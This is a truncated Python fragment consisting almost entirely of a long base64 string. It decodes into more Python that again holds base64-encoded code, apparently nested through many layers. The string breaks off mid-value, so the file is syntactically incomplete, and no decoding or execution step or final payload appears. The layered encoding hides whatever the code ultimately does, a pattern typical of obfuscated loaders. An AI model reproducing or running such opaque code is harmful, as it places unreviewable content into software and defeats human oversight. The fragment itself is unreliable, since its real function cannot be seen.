import base64
encoded_data = ''aW1wb3J0IGJhc2U2NAplbmNvZGVkX2RhdGEgPSAnJydhVzF3YjNKMElHSmhjMlUyTkFwbGJtTnZaR1ZrWDJSaGRHRWdQU0FuSnlkaFZ6RjNZak5LTUVsSFNtaGpNbFV5VGtGd2JHSnRUblphUjFacldESlNhR1JIUldkUVUwRnVTbmxrYUZaNlJqTlphazVMVFVWc1NWTnRlR3BYUmxweldYcE9VMlZyVG01alIxcFpUVVphVUZWcldrTlZSazVXVGxaV1dVMVdXbFJXUlZrMVdtczVjRkZ1Y0d0VFJXeHVWVVpPUW1GWFJrbFZha0pxVTBVd01sUklhelZOUm5CWVpVaFNhMVo2VmpGWmVrcHZaRzFPUkU1WWNHcFhSbHB2V1RJeFYwMHhjRmhUV0ZaYVYwVktNMVJFU2tka01rWlVVMVYwUkdKVk5YcFhWbWhQWld0c1IxRnRhR2hOTVZveFYydGpORTVyVG5CUlYyUktVVEJLY2xkc1pGcGFNV2Q0VDFoQ2FXSlhkM2RYUkVVMFlqSk5lVlp1VG1GaFdHUnVWMVprVDJGc2NGbFVibkJaVFc1U2MxcFdUbkphTUhoVlRrZGtWV0pVYkRGWGJGSjJVekJzUkZGWFpFcFJNRVp1VTFWT1EyVnNjRmhsUnpGTllsVlplRnBGWkc5YWJWSklUMWhLWVZaNlVtNVZSazVEVkRKSmVVNVhlRVJoVlVadVUxVk9RbG93YkVSUlYyUnFUV3hhZWxkdGF6RmhSbXQ1VkcxNGFrMHdOVzFaVkVwWFRsVnNSVTFIWkZwV01EVnhWMnhvVDJWc1ozbGtSM2hzVlZjNWJsTlZUa0phTUU1d1VWZGtTbEV3U25KWGJHUmFXakpLU0U5WE5XaFdlbEoyV1hwS1YyTXhjSEJrTW1SaFZucEdiMWxXWkROak1HeEpVVzFvYWswd05IcFphazVMWVRCMFZGRllVbEZoVlVwM1dXMDFVazVyVG5CUlYyUktVVEJHYmxOVlRrSmFNazVJVW1wV2FWSjZiRzlYYTA1Q1QxVnNTV015WkVwaVZWcHhWMVJKTlUxWFNuVlZiVnBoVm5wR2IxbFdaRE5oVlRsd1VXMTRhVll3V25kWmEwNHpXakJzZEZKdGNGcE5hbXQ0V1cwMVUxcHRUa2hTYm5CcVRUSlNNbGt5TVZKaFZUbHdVVzVrV2xkRk5UWmFSRWsxWlZad1JGRnFiRVJoVlVadVUxVk9RbG93YkVSUlYyUnFVakJhTlZkV1kzaGxhMnhGVFVka2JHVlZSa3hUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JIUmtSM2hzVlRCck1sTlZhRTlpUjBwSVYxaFdXbFl3TlhGWGJHaFBaV3huZVdSSGVHeFZNMlJ1VVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVMjFvV2sxck5XMVhiR040WVVkR1dHUXliRkJoVlVweldXeGtSMk5IU2tSa01tUkVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1TFlVWnJlVlJ0V21wU01GbzJXVE5zU2s1cmJFbFJiV2hxVFRBMGVsbHFUa3RoTUU1d1VWZGtTbEV3Um01VFZVNUNXakphVW1JeVpFcFJNRVp1VTFWT1Fsb3diRWxUYlhocVRUQktNbGx0TlU5aVJXeEZUVWRrYW1KV1dqUmFSbVJYWlcxU1NWUllWbXBTZW13MldrVk9iMkpWYkhWa1IxcFpUVVphVUZWcldrTlZSazVXVGxaV1dVMVdXbFJXUlZrMVdtMWFWRTlYYUZwTmF6VXlXa1pqTVUxR1ozbGxTRnBoVFcxNE1WTlhiRE5hTWs1SVVtNXNXbFo2UmpaVlJtaERZVWRPZEZKdVVtcGxXR1J1VjJ0a1IwMUdiRlZOV0dSYVYwZDRlbGxxU2tkaE1IUlNZakprU2xFd1JtNVRWVTVDV2pCc1NWTnRlR3BOTUVveVdXMDFUMkpHWjNsVmJYaGFUV3BzY2xkc1pGSmFNVUpVVVc1c1lWZEZOVE5aYWtreFpXeHdWRTVZUm1wTmFtd3hVekJPY2xNd2JFUlJWMlJLVVRCR2JsTlZUa05qUm5Cd1VXNXNZVmRGTlROWmFra3haV3h3VjA5WGRHRldNRFV5VjJ0a1YyRXdlSFJhUjNoclVUSmtjRmxxU25waFZYUlZZakIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVdYcEtWMk14Y0hCT1YyaHJWMFpLZGxkRVRsTmtiVVY1Vm01V1NsSkVRbTVaTWpGWFpXMU9TRTlZVm1wTmJGcHRWMnRrVjJGdFNYbFZiWGhoVVhwV2RWZHNhRkppTUd4MFVtcEdhMUl5WkhCVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWb1MySkhVa2xXYm14cFlWVktOVmRzYUU5a01rbDVUbGh3WVZacWJISlhiR1JQWkd4d1NGWnRkRTFpVjFKeldrVk9ibUZXY0ZsVGJteHBUVEJzY0ZNeFJuWlRNR3hFVVZka1NsSXhTbk5YYld4RFlXMUdTRkp1Vm1GTmJGcHRWMnhqZUdGSFJsaGtNamxxVFd4YWVsZHRiRE5hTWtwMFZtcE9XVTFzV2pCWFZtUnpZekIwVldJd2RFcFJNRVp1VTFWT1Fsb3diRVJSYm1SYVYwZDRlbGxxU2tkaE1HeEZUVWRrYkdReU9XNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbUZXYkZoVWJYQnBUVEZhTVZwRldUVmhSMUpaVlcwNVNtRnRPVzVaZWtwWFl6RndjRTVYYUd0WFJrcDJWMFJPVTJSdFJYbFdibFpOVVZjNWJsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNZVmRLZEZacVRsbE5iRm93VjFaa2MyTXdiSEZpTW1ScFlsWlplbGRFU2xka1JteFlZa2hPUkdGVlJtNVRWVTVDV2pCc1JGRlhaRzFWVnpsdVUxVk9RbG93YkVSUlYyUktVMFZLYjFreU1VZGtSMDQxVVZSc1NsTklUa3hUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JIUmtSM2hzVlRCck1sTlZhRTlpUjBwSVYxaFdXbFl3TlhGWGJHaFBaV3huZVdSSGVHeFZNMlJNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeDBUbGQ0YTAxVWJITlpiR1JIWTBkS1JGTlVXa3BTZWxaeldrUkZOV0pIU2xoU2JrSnBVVmM1YmxOVlRrSmFNR3hFVVZka1NsTkVRa3hUVlU1Q1dqQnNSRkZYWkVwUk1FbzFWMnhvVDJReVNYbE9XSEJoVlRCRk5WTlZhRXRpUjA1WlZtMTRhazB4U2paVVJ6VkRaRzFOZWxWWE9XRmhWVzh6VjBSRk5WSnNVbkpWYkVaVlRVZDRVRlpyV1RWV2JGWnlaVWRhV1UxNlFqSlhWRXB2WVVkS2RGcEhlRmxOYkZvd1YxWmtjMk13YkhCa01tUnFVakJhTlZkV1kzaGxiRUpaVVcxb2FtSlZXakJaTTJ3eldqRndTRkpxUWxwV1JFWXpWMVpvYzJNeVNYbFNiWFJNVlZjNWJsTlZUa0phTUd4RVVWZGtTbE5GY0hOWmVrNURaRzFLZFZSdGVGbE5iRXB6VjFSSk5XRXhjRmhWVjJSUlZUQktOVmRzYUU5a01rbDVUbGh3WVZWNlZuaFpla2sxWkZWMFJHRXdkRXBSTUVadVUxVk9RbG93YkVSUmJrSmhZVlZLTlZkc2FFOWtNa2w1VGxod1lWWnFiSEpYYkdSUFpHeHdTRlp0ZEUxaVYxSnpXa1ZPYm1GWFNuUldhazVaVFRGS01sbFVTbGRrVld4d1lYcGFSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWb1QySkhTa2hYV0ZaYVYwWlpkMWxWV1RWTlIwbDVaRWQ0YVdGVlJUVlRWV2hMWWtkTmVsRnVXbWxpYXpWelYwUktVMkpHYTNsUFYzUmhWakZLYVZOWE1ERmlSMUY0VDFSQ2FVMXVVbk5aYld4TFdrVk9jRkZYWkVwUk1FWnVVMVZPUWxveVRuUldha0pyVjBWd01WTlZhRXRpUjAxNlVXNWFhV0pyTlhOWFJFcFRZa1pyZVU5WGRHRldNVVl4VjJwS1YwMUZkRVJUYmxwb1pWVnNkMUV5YkVKYU1HeEVVVlYwU2xFd1JtNVRWV1JUWWtad2NGRnViR0ZXTWxKM1dYcE9VMkpIVG5CaFNIQmhWak5vZEZSRlRrTmlSMHBZVW01Q2FWRXpaRzVaTUdSSFpXMU5lbHBJV21waVZrWjNVMVZOZDBzd2JFaGlTRlpyVWtjNVRGTlZUa0phTUd4RVVWZGtTbEV3U2pOWFZtaHpZekpKZVZKdGRFcFNSRUp1V2xoc1FtRldiRmhVYlhCcFRURmFNVnBGV1RWaVIwcFlVbTVDYVZFd2F6SlRWV1JYWkVac1dHSklUazFSTUVad1YxWmtUMkZ0U1hwV2JsWnJVbXBzTTFkV2FFOWxiVkY1VDFoc1lWRXdhekpUVldoRFlVZE5lbFJxVG1sTk1IQnlVMVZuZDFNd2JFUlJWMlJLVVRCR2JsTlZUa05rTVd4WlUyMW9hVmRGTVc1VlJrNURUakJzUkZOdVNtRlhSM1J3VkRKc1EyVnNjRmhsUnpGTllsVmFjVmRVU2xkbGJVMTRUMWhLWVZkSGRHNWFiRVoyV2pCc1JGRlhaRXBSTUVadVUxVm9TMkpIVFhwUmJscHBZbXMxYzFOVlVYZGFNazUwVm01b2ExWXhXalphUldoT1pGZE9TRTlZY0d0Uk1taDBVMWMxTUZwc1ozZFdhemxUVW10S1VWVXhWVEZXVm1kNFZteE9WVkpxYkcxYWJFMDFZVVpyZVZSdVdtdFdlbFYzVjBST1MySkdiM2xpU0hCclVqRmFOVk5YYkROYU1rNUlVbTVzV2xaNlJqWlZSbWhEWVVkT2RGSnVVbXBsV0dSdVYydGtSMDFHYkZWTldHUmFWMGQ0ZWxscVNrZGhNSFJTWWpKa1NsRXdSbTVUVlU1Q1dqQnNTVk50ZUdwTk1Fb3lXVzAxVDJKR1ozbFZiWGhhVFdwc2NsZHNaRkphTVVKVVVXNXNZVmRGTlROWmFra3haV3h3VkU1WVJtcE5hbXd4VXpCT2NsTXdiRVJSVjJSS1VUQkdibE5WVGtObFZuQlpWV3BHYW1KVVVtNVpNakZYWlcxT1NFOVlWbXBOYkZwdFYydGtWMkZ0U1hsVmJYaGhVWHBXZFZkc2FGSmlNR3gwVm01c2FtSlViRFZUVjJ4eVV6QnNSRkZYWkVwUlZ6bHVVMVZPUWxveGNFaFdiVEZLVWpGS2MxbHJaRmROUm5CVVlVaHdZVll6YUhSVE1WSjJVekJzUkZGWFpFcFJNRVp1VTFWT1EyUXhiRmxpU0U1cFRXdGFjbE5WVVhkYU1sWTFVVmRzV2xZd05YRlphazVYWkZkU1IwOVhhR3RYUmtwMlUxZHdkbG95VFhsV2JrNWhZVlJXYjFwR2FGTmlNV2Q2Vlc1YWFFMXNXakZUVldkM1V6QnNSRkZYWkVwUk1FWnVVMVZPUTJReGJGbFRiV2hwVjBVeGJsVkdUa05PTUd4RVUyNUtZVmRIZEhCVU1teERaV3h3V0dWSE1VMWlWVnB4VjFSS1YyVnRUWGhQV0VwaFYwZDBibHBzUm5aYU1HeEVVVmRrU2xFd1JtNVRWV2hMWWtkT1dWWnRlR3BOTVVvMlZFYzFRMlJ0VFhwVlZ6bGhZVlZ2TTFkRVJUVlNiRkp5Vld4R1ZVMUhlRkJXYTFrMVZteFdjbVZIV2xsTmVrSXlWMVprVDJGdFNYcFdibFpyVW1wc2NsZHNaRFJpUjFKSVZsZHNUVkV3U2pOWFZtaExZVWRLV1ZSVWJHcFNNRm8xVjFaamVHVnJlRVJSYlhSYVYwWktiMVZHYUVOaFIxWllaVWhhV2xZeFJuZFJNbVIyV2pCc1JGRlhaR0ZTTVZwMFUxVmthMkpIVWtkUFdHUnBVakJaTVZkc2FFdGFiSEJJVW1wQ1dsVXlhRFpYYkdRMFlsVjBWRkZZVWxGaFZVcHZXVzAxY2s1clRuQlJWMlJLVVRCR2JsTlZUa0phTWs1SVVtcFdhVko2Ykc5WGEwNUNUMVZzU1dNeVpFcGlWVnB4VjFSSk5VMVhTblZWYlZwYVYwWlpkMWxWVGtwT2EyeEpWRzE0YVZJeGJERlhWbWhYVFVkR1IwOVVRbWxOYmxKeldXMXNRMDlWVG5CUlYyUktVVEJHYmxOVlRrSmFNazVJVW01c1dsWjZSalpUVlZGM1dqSldOVkZYYkdoTmJGa3hVMWR3ZGxveVRYbFdiazVoWVZSV2IxZFVTazlpUjAxNlZHMWFhRTFzV1RGVFZXZDNVekJzUkZGWFpFcFJNRVp1VTFWT1EyVldjRmxVYm1ScFRXcFdObGRzVGtKUFZXeEpVMjE0YWxkR1duTlplazVUWld0NGRWRnVXbXBOTVVaMlYyMXNTMDR4WjNoUFZWcFZZVEZLVWxaRVFuTlVNVnBIVDFaYVZtRXphRzFYUkUxM1pHeHZlVlpxUWxsTmJFcHZXa1ZrUm1GVmVFUlJibVJhVjBWd2IxbHNhRTVQVjA1SVVtNXNXbFo2UmpaVVJVNURZVEZzV1ZWdGFGRlhSVXB2V2xaa05HUnNiRmhWV0VKRVlWVkdibE5WVGtKYU1HeEVVVmRrYW1KV1dqWlpNR00xWkZkTmVWWnRXbUZTTVZweFdXcEtVMkpHY0VSUlZHeEtVMFZ3YzFsNlRrTmtiVXAxVkcxNFRXSllRalpaYWtrd1lqQjBVbUl5WkVwUk1FWnVVMVZPUWxvd2JFbFRiWGhyVTBaYU5WbHRiRU5sVm5CWlZHNWthVTFxVmpaWGJGazFZVEZ3V0ZSdVdtRlNNVnB5VVRKc1Fsb3diRVJSVlhSS1VUQkdibE5WWkZOaVJuQndVVzV3WVZkR1NtMVpNR1EwWVVkV1dGWnViRmxOTUhCdldXMHhlbUl5VFhsV2JrNWhZVmQwYmxSR1VUQmFNV3gwVDFoYWFWSkhPVXhUVlU1Q1dqQnNSRkZYWkVwUk1Fb3pWMVpvYzJNeVNYbFNiWFJLVWtSQ2JscFliRUpoVm14WVZHMXdhVTB4V2pGYVJWazFZVWRTV1ZWdE9VcGhiVGx1V1hwS1YyTXhjSEJPVjJoclYwWktkbGRFVGxOa2JVVjVWbTVXU2xORVFreFRWVTVDV2pCc1JGRlhaRXBSTUVvelYxWm9TMkZIU2xsVVYyUlJWVEJKTTFOVlRrdGpiSEJaWVRKc1VHRlZTalpYYkdRMFlsVjRkRkp0Y0ZwTmJGbzJXWHBGTldOc2NGbGhNbVJ0VlZjNWJsTlZUa0phTUd4RVVWZGtTbE5GY0hOWmVrNURaRzFLZFZSdGVFcFNSRUp1V1RJeFYyVkhVbGhXYm5CclUwVXhNVmt3WXpWbGJWSkVZVWN4U21KdVVtMVhSRUpYVkRGS1IxRnNRbFJXVkZaV1YwUkdWMVV4VWtkUFYxcHRWWHBzTmxkc2FGTmFiVTUwVW01V2FHVlZiSHBUVldoRFlVZE9kRkp1VW1wbGFrWXpWMVpvUzJGSFNsbFVXRTVLVWpGS2IxcEZaRVpQVjA1SVVtcFdhVko2Ykc5WGEwNXlVekJzUkZGWFpFcFJNRVp1VTFWT1EyVldjRmxVYm1ScFRXcFdObGRzV1RWaE1YQllWRzVhWVZJeFduSlRWVkYzV2pKT2RGWnVjR3BTZW13eFdYcEtWbVJYUm5WVWJscHBZVmRrZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVaTWpGWFRVZFNXVk51VmtwVFJYQnpXWHBPUTJSdFNuVlViWGhaVFd4S2MxZFVTVFZoTVhCWVZWaFdZVTFzV1hkVE1FNUxaRzFHTlZOWVFrUmhWVVp1VTFWT1FsTXdiRVJSVjJSS1VqRktjMWR0YkVOaWJIQlpWVzFhYUUxc1dURlhSRXBUWVVkU1NGSlhPV3BOYkZwNlYyMXNjbG93ZUZWT1IyUmFWbnBWTVZReVpIWmFNR3hFVVZka1NsRXdSbTVUVldoRFlVZE9kRkp1VW1wbFZVVTFVMVZvZWxvd2JIUmtSM2hzVlRCck1sTlZhRTlpUjBwSVYxaFdXbFl3TlhGWGJHaFBaV3huZVdSSGVHeFZNRWsxVVRKc1Fsb3diRVJSVjJSS1VUQkdibGt5TVZkbGJVNUlUMWhXYWsxc1ZtNVZSazVEWlZad1dWSnFSbUZYUlRSM1dUTnJNV0pzY0ZsVlZ6bGhZVlZ2TTFkRVJUVlNiRkp5Vld4R1ZVMUhlRkJXYTFrMVZteFdjbVZIV2xsTmVrSXlWMnBLVjAxR1ozbGtSM2hzVm1wc2NsZFdhRk5oUld4d1pESmthbEl3V2pWWFZtTjRaV3hDV1ZGdGFHcGlWVm93V1ROc2NsTXdiRVJSVjJSS1VUQkdibE5WVGtObFZuQlpWRzVrYVUxcVZqWlhiRmsxWVRGd1dGUnVXbUZTTVZweVUxVlJkMW95VG5SV2JuQnFVbnBzTVZsNlNsWmtWMFoxVkc1YWFXRlhaSGRSTW14Q1dqQnNSRkZYWkVwUk1FWnVXVEl4VjAxSFVsbFRibFpLVTBWd2MxbDZUa05rYlVwMVZHMTRXVTFzU25OWFZFazFZVEZ3V0ZWVmRFcFJNRVp1VTFWR2Rsb3diRVJSVjJSaFVqRmFkRk5WYUU5aVIxSkhUMWhrYVZJd1dURlhiR2hMV20xS1dFOVlWbUZYUjNSMldYcEtWMk14Y0hCa01tUmFWbnBHTWxwR1l6Rk5SWFJVVVZoU1VXRlZTbkJaYWtrMVl6QTVibUl5WkVwUk1FWnVVMVZPUWxvd2JFbFJiV2hzVmpOb01sZFdaRkphTVVKVVVXcGtSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1MyRkdhM2xVYmxwclZucFZkMWRFU2tkTlYxSklXakpzVUdGVlNqWlhiR1EwWWxWNGRGSnFSbXRTTW1odFdrVmpOV05zY0ZoT1NFNUVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1TFlVZEtXRTlVUm1saWJFWndWREpzUTJGSFNsaFBWRVpwWW14R1RGTlZUa0phTUd4RVVWZGtTbEV3U1RWUk1teENXakJzUkZGWFpFcFJNRVp1V1RCa1IyVldiRmhOV0hCS1VrUkNibHBZYkVKaFYwVjVWbXBXU21GdE9XNVpla3BYWXpGd2NFNVhhRnBOYXpWeldYcE9UMXB0UlhsV2FsWktVMFJDVEZOVlRrSmFNR3hFVVZka1NsRXdTalZYYkdoUFpESkplVTVZY0dGVk1FVTFVMVZvUzJKSFRsbFdiWGhxVFRGS05sUkhOVU5rYlUxNlZWYzVZV0ZWYnpOWFJFVTFVbXhTY2xWc1JsVk5SM2hRVm10Wk5WWnNWbkpsUjFwWlRYcENNbGw2U2xkTlJtZDVUVmhhYVdKV1dURlRWMnd6V2pKT1NGSnViRnBXZWtZMlZVWm9RMkZIVG5SU2JsSnFaVmhrYmxkclpFZE5SbXhWVFZoa1dsZEhlSHBaYWtwSFlUQjBVbUl5WkVwUk1FWnVVMVZPUWxvd2JFbFRiWGhxVFRCS01sbHROVTlpUm1kNVZXMTRXazFxYkhKWGJHUlNXakZDVkZGdWJHRlhSVFV6V1dwSk1XVnNjRlJPV0VacVRXcHNNVk13VG5KVE1HeEVVVmRrU2xFd1JtNVRWVTVEWlZad1dWVnFSbXBpVkZKdVdUSXhWMlZ0VGtoUFdGWnFUV3hhYlZkclpGZGhiVWw1VlcxNFlWRjZWblZYYkdoU1lqQnNkRTlZU2twaFYzUk1VMVZPUWxvd2JFSmlNbVJLVVRCR2JsZHJaRmRpVld4SlZHMTRhMUpxYkROWmEyUkhUbFp3V1ZOdFdscE5hbXgzV1cwMVRtSXlUWGxXYms1aFlWaGtibGRXWTNoa2JWSllUbFJDVEZVd1JqQlZSMnhEWVZkSmVVOVlUbEJhTWpsdVUxVk9RbG93YkVSUlYyUktVMFZLYjFwV1pEUmtiR3hZVlZka1VWVXdTVE5STW14Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlRiV2hhVFdzMU1scEdZekZOUm1kNVVtcEdhMUl5WkhCVU1teERaV3h3V0dWSE1VMWlWVmw0V2tWa2IxcHRVa2hQV0VwaFZucFNlbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGTnRhR2xXZW10NFdXMDFVbUZWT1hCUmJXaHBWbnByZUZsdE5WSlRNR3hFVVZka1NsRXdSbTVUVlU1RFQxVk9jRkZYWkVwUk1FWnVVMVZPUWxveVRraFNibXhhVm5wR05sTlZVWGRhTWxZMVVWZHNhRTFzV1RGVFYzQjJXakpOZVZadVRtRmhWRlp2VjFSS1QySkhUWHBVYlZwb1RXeFpNVk5WWjNkVE1HeEVVVmRrU2xFd1JtNVRWVTVEWlZad1dWUnVaR2xOYWxZMlYyeE9RazlWYkVsVGJYaHFWMFphYzFsNlRsTmxhM2gxVVc1YWFrMHhSblpYYld4TFRqRm5lRTlWV2xWaE1VcFNWa1JDYzFReFdrZFBWbHBXWVROb2JWZEVUWGRrYlUxNVZtcENXVTFyTlRKWlZtTXhaV3RzY0dReVpHcFNNRm8xVjFaamVHVnNRbGxSYldocVlsVmFNRmt6YkROYU1YQklVbXBDV2xaRVJqTlhWbWh6WXpKSmVWSnRkRXhWVnpsdVUxVk9RbG93YkVSUlYyUktVMFZ3YzFsNlRrTmtiVXAxVkcxNFdVMXNTbk5YVkVrMVlURndXRlZYWkZGVk1FbzFWMnhvVDJReVNYbE9XSEJoVlhwV2VGbDZTVFZrVlhSRVlUQjBTbEV3Um01VFZVNUNXakJzUkZGdWJHRlhSa2w0V1RJd01Gb3lUblJXYm5CcVVucHNNVmw2U2xkYWJIQklWbTF3YVUxc1NuTlhhMDB4WW14d1dWVlhPVXBpVkd4NVUxZHNjbE13YkVSUlYyUktVVmM1YmxOVlRrSmFNWEJJVm0weFNsTkZOWE5hUlZrMVpESktTRkpxVm1GWFJYQnRXVzB4UjJSR2NGUmhTSEJoVmpOb2RGUkZUa05rVm14WVRWZDRURlV3UmpCVlIyeERZVmRKZVU5WVRsQmFNamx1VTFWT1Fsb3diRVJSVjJSS1UwVktiMXBXWkRSa2JHeFlWVmRrVVZVd1NUTlRWVTVMWVVacmVWUnVXbXRXZWxWM1YwUktSMDFYVWtoYU1teFFZVlZLTmxkc1pEUmlWWGgwVW1wR2ExSXlhRzFhUldNMVkyeHdXRTVJVGtwUk1IQXhWMVpqZUdKRmJIRmlNbVJwWWxWYU1GZHNUa05QVlU1d1VWZGtTbEV3Um01VFZVNUNXakpPU0ZKdWJGcFdla1kyVTFWUmQxb3lWalZSVjJ4b1RXeFpNVk5YY0haYU1rMTVWbTVPWVdGVVZtOVhWRXBQWWtkTmVsUnRXbWhOYkZreFUxVm5kMU13YkVSUlYyUktVVEJHYmxOVlRrTmxWbkJaVkc1a2FVMXFWalpYYkU1Q1QxVnNTVk50ZUdwWFJscHpXWHBPVTJWcmVIVlJibHBxVFRGR2RsZHRiRXRPTVdkNFQxVmFWV0V4U2xKV1JFSnpWREZhUjA5V1dsWmhNMmh0VjBSTmQyUnRUWGxXYWtKWlRXcFdiMWxzWkZaaFZYaEVVVzVrV2xkRmNHOVpiR2hPVDFkT1NGSnViRnBXZWtZMlZFVk9RMkV4YkZsVmJXaFJWMFZLYjFwV1pEUmtiR3hZVlZoQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkdwaVZsbzJXVEJqTldSWFRYbFdiVnBoVWpGYWNWbHFTbE5pUm5CRVVWUnNTbE5GY0hOWmVrNURaRzFLZFZSdGVFMWlXRUkyV1dwSk1HSXdkRkppTW1SS1VUQkdibE5WVGtKYU1HeEpVMjE0YTFOR1dqVlpiV3hEWlZad1dWUnVaR2xOYWxZMlYyeFpOV0V4Y0ZoVWJscGhVakZhY2xSSE1XdGlSMUpFV2pKc2FVMXVUbkJUTVVaMldqQnNSRkZYWkVSaFZVWnVVMVZPUTJFeGNGaFhWMlJxVFd4WmQxZEVUa05qTVd4WllrZDRhbUpFYkhwWmFrcFBZVWRLU0dKSGRFeFRSVFZ6V1d0a1dtTXdiRWhpUjNSTVZUQkdNRlZIYkVOaFYwbDVUMWhPVUZveU9XNVRWVTVDV2pCc1JGRlhaRXBUUlVwdldsWmtOR1JzYkZoVlYyUlJWVEJKTTFOVlRrdGhSbXQ1Vkc1YWExWjZWWGRYUkVwSFRWZFNTRm95YkZCaFZVbzJWMnhrTkdKVmVIUlNha1pyVWpKb2JWcEZZelZqYkhCWVRraE9TbEV3Y0hkWGEwNUtUbXRzU0dKSGRFcFRSRUpNVTFWT1Fsb3diRVJSVjJSS1VUQktNMWRXYUV0aFIwcFpWRmRrVVZVd1NUTlRWVTVMWTJ4d1dXRXliRkJoVlVvMlYyeGtOR0pWZUhSU2JYQmFUV3hhTmxsNlJUVmpiSEJaWVRKa2JWVlhPVzVUVlU1Q1dqQnNSRkZYWkVwVFJYQnpXWHBPUTJSdFNuVlViWGhLVWtSQ2Jsa3lNVmRsUjFKWVZtNXdhMU5GTVRGWk1HTTFaVzFTUkdGSE1VcGlibEp0VjBSQ1YxUXhTa2RSYkVKVVZsUldWbGRFUmxkVk1WSkhUMWRhYlZWNmJEWlhiR2hUV20xR1dGVlhiRTFSTUVvelYxWm9TMkZIU2xsVVZHeHFVakJhTlZkV1kzaGxhM2hFVVcxMFdsZEdTbTlWUm1oRFlVZFdXR1ZJV2xwV01VWjNVVEpzUWxvd2JFUlJWMlJLVVRCR2Jsa3lNVmRsYlU1SVQxaFdhazFzV20xWGEyUlhZVzFKZVZWdGVHRlJNRVUxVTFWb1MySkhUWHBSYmxwcFltczFjMVJITVhkbGJVbDVUa2M1VEZWWE9XNVRWVTVDV2pCc1JGRlhaRXBUUlhCeldrVm9WMlZYU25CUmJteGhWMFUxTTFscVNURmxiSEJYVDFkMFlWWXdOVEpYYTJSWFlUQjRkRnBIZUd0Uk1tUndXV3BLZW1GVmRGSmlNbVJLVVRCR2JsRXliRUphTUd4RVVXMTBZVll4Ykc1WGFrcFhUVVpuZWxGdVRscFhSM2h6V1RKM05XRnNiRmxUVnpscVRXeGFlbGR0YkROYU1XdDVVbTVzV1UxdGVISlRNVTVDWkVaQ2NGRnRhR2xpYlhNeVVUSnNRbG93YkVSUlYyUktVVEJHYmxrd1pFZE9WMHBJVDFkb1lWRXdSVFZUVldoNldqQnNkRkp0Y0ZwTmFtdDRXVzAxVTFwc2JGbFdha0pvVVRCck1sTlZhRTlpUjBwSVYxaFdXbGRHV1hkWlZWazFUVWRKZVdSSGVHbGhXR1J1VTFjeFQyRkhUbk5QV0VKaFVUQnJNbE5WWkU5aFIwNXpUMWhDWVZFd1NUVlJNbXhDV2pCc1JGRlhaRXBSTUVadVdUQmtSMlZXYkZoTldIQktVa1JDYmxwWWJFSmhWMFY1Vm1wV1NtRnRPVzVaZWtwWFl6RndjRTVYYUZwTmF6VnpXWHBPVDFwdFJYbFdhbFpLVTBSQ1RGTlZUa0phTUd4RVVWZGtTbEV3U2pWWGJHaFBaREpKZVU1WWNHRlZNRVUxVTFWb1MySkhUbGxXYlhocVRURktObFJITlVOa2JVMTZWVmM1WVdGVmJ6TlhSRVUxVW14U2NsVnNSbFZOUjNoUVZtdFpOVlpzVm5KbFIxcFpUWHBDTWxkcVNsZE5SbWQ1Vkcxb2FtRlZiSHBUVldoRFlVZE9kRkp1VW1wbGFrWXpWMVpvUzJGSFNsbFVXRTVLVWpGS2IxcEZaRVpQVjA1SVVtcFdhVko2Ykc5WGEwNXlVekJzUkZGWFpFcFJNRVp1VTFWT1EyVldjRmxVYm1ScFRXcFdObGRzV1RWaE1YQllWRzVhWVZJeFduSlRWVkYzV2pKT2RGWnVjR3BTZW13eFdYcEtWbVJYUm5WVWJscHBZVmRrZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVaTWpGWFRVZFNXVk51VmtwVFJYQnpXWHBPUTJSdFNuVlViWGhaVFd4S2MxZFVTVFZoTVhCWVZWaFdZVTFzV1hkVE1FNUxaRzFHTlZOWVFrUmhWVVp1VTFWT1FsTXdiRVJSVjJSS1VqRktjMWR0YkVOaE1YQllaVWQ0YTFJeFdtMVpNR1EwWVVkV1dGWnViRmxOYkhBMVdWWmtWMlJXY0VsVVZ6bHFUV3hhZWxkdGJISmFNSGhWVGtka1dtSlViREpaYTFKMlV6QnNSRkZYWkVwUk1FWnVVMVZPUTJReGJGbGlTRTVwVFd0YWNsTlZVWGRhTWxZMVVWZHNXbFl3TlhGWmFrNVhaRmRTUjA5WGFHdFhSa3AyVTFkd2Rsb3lUWGxXYms1aFlWUldiMXBHYUZOaU1XZDZWVzVhYUUxc1dqRlRWV2QzVXpCc1JGRlhaRXBSTUVadVUxVk9RMlF4YkZsVGJXaHBWMFV4YmxWR1RrTk9NR3hFVTI1S1lWZEhkSEJVTW14RFpXeHdXR1ZITVUxaVZWcHhWMVJLVjJWdFRYaFBXRXBoVjBkMGJscHNSblphTUd4RVVWZGtTbEV3Um01VFZXaExZa2ROZWxGdVdtbGlhelZ6VTFWUmQxb3lUblJXYm1oclZqRmFObHBGYUU1a1YwNUlUMWh3YTFFeWFIUlRWelV3V214bmQxWnJPVk5TYTBwUlZURlZNVlpXWjNoV2JFNVZVbXBzYlZwc1RUVmhNWEJZWlVkNGExSXhXbTFYYlRWTFkwWndXRTVYZEdwbFZXeDZVMVZvUTJGSFRuUlNibEpxWldwR00xZFdhRXRoUjBwWlZGaE9TbEl4U205YVJXUkdUMWRPU0ZKcVZtbFNlbXh2VjJ0T2NsTXdiRVJSVjJSS1VUQkdibE5WVGtObFZuQlpWRzVrYVUxcVZqWlhiRmsxWVRGd1dGUnVXbUZTTVZweVUxVlJkMW95VG5SV2JuQnFVbnBzTVZsNlNsWmtWMFoxVkc1YWFXRlhaSGRSTW14Q1dqQnNSRkZYWkVwUk1FWnVXVEl4VjAxSFVsbFRibFpLVTBWd2MxbDZUa05rYlVwMVZHMTRXV